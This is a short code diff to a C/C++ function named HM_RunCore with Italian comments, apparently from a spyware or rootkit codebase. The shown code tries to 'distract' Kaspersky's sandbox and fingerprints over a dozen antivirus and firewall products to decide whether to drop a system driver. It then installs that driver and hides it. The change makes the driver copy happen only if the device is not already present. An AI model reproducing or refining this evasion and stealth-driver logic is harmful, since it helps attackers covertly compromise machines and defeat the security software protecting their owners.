@@ -1507,21 +1507,26 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	// Cerca di "distrarre" la sandbox di kaspersky
 	HIDING();
 
+	HideDevice dev_probe;
+
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
 	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
 		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())  && (!IsFSecure() || IsDeepFreeze())) {
 		WCHAR drv_path[DLLNAMELEN*2];
+		ZeroMemory(drv_path, sizeof(drv_path));
 
 		if (!HM_GuessNames()) {
 			ReportCannotInstall();
 			return;
 		}
 
-		// Copia il driver
-		if (!CopySystemDriver(drv_path)) {
-			ReportCannotInstall();
-			return;
+		// Copia il driver (solo se non c'e' gia')
+		if (!dev_probe.unhook_isdev()) {
+			if (!CopySystemDriver(drv_path)) {
+				ReportCannotInstall();
+				return;
+			}
 		}
 
 		HideDevice dev_unhook(drv_path);
